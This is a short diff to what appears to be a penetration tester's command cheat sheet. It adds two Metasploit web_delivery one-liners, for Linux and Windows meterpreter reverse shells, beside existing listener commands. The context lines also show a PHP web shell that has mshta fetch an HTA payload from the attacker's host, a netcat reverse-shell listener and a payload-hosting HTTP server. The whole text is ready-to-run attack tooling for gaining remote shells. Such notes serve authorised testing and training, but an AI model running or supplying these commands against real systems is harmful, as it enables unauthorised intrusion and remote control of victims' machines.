@@ -295,6 +295,8 @@ echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
 +---------- Listeners ----------+
 python3 -m http.server 8888 -d ~/Upload
 rlwrap nc -lvnp 5555
+rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 2; set payload windows/x64/meterpreter/reverse_tcp; run"
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
 rlwrap msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
